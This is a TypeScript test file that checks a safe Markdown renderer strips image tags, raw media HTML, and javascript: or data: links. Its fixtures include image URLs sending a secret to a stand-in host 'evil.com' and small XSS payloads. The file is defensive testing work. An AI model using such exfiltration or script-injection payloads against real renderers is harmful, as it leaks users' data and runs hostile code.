import { marked } from 'marked';

import { safeMarkdownOptionsFactory } from './safe-markdown-options.factory';

function renderMarkdown(input: string): string {
    const { renderer } = safeMarkdownOptionsFactory();
    marked.use({ renderer });
    return marked.parse(input) as string;
}

describe('safeMarkdownOptionsFactory', () => {
    describe('image exfiltration prevention', () => {
        it('should convert markdown image to a safe link', () => {
            const result = renderMarkdown('![alt](https://evil.com/?d=SECRET)');
            expect(result).not.toContain('<img');
            expect(result).toContain('[image: alt]');
            expect(result).toContain('href="https://evil.com/?d=SECRET"');
        });

        it('should convert reference-style image to a safe link', () => {
            const result = renderMarkdown('![alt][ref]\n\n[ref]: https://evil.com/?d=SECRET');
            expect(result).not.toContain('<img');
            expect(result).toContain('[image: alt]');
        });

        it('should escape raw <img> HTML tag', () => {
            const result = renderMarkdown('hi <img src="https://evil.com/?d=SECRET">');
            expect(result).not.toContain('<img');
            expect(result).toContain('&lt;img');
        });

        it('should escape raw <video poster="..."> HTML tag', () => {
            const result = renderMarkdown('<video poster="https://evil.com/p"></video>');
            expect(result).not.toContain('<video');
            expect(result).toContain('&lt;video');
        });

        it('should escape raw <picture>/<source> HTML tags', () => {
            const result = renderMarkdown('<picture><source srcset="https://evil.com/x"></picture>');
            expect(result).not.toContain('<picture');
            expect(result).not.toContain('<source');
        });
    });

    describe('link sanitization', () => {
        it('should strip javascript: links', () => {
            const result = renderMarkdown('[click](javascript:alert(1))');
            expect(result).not.toContain('href="javascript');
            expect(result).toContain('click');
        });

        it('should strip data: links', () => {
            const result = renderMarkdown('[click](data:text/html,<script>alert(1)</script>)');
            expect(result).not.toContain('href="data:');
        });

        it('should allow https links with safe attributes', () => {
            const result = renderMarkdown('[safe](https://example.com)');
            expect(result).toContain('href="https://example.com"');
            expect(result).toContain('rel="noopener noreferrer"');
            expect(result).toContain('target="_blank"');
        });

        it('should allow mailto links', () => {
            const result = renderMarkdown('[email](mailto:a@b.com)');
            expect(result).toContain('href="mailto:a@b.com"');
        });
    });

    describe('nested image inside link', () => {
        it('should not produce <img> for image nested inside a link', () => {
            const result = renderMarkdown('[![alt](https://evil.com)](https://ok.com)');
            expect(result).not.toContain('<img');
            expect(result).toContain('[image: alt]');
        });
    });
});
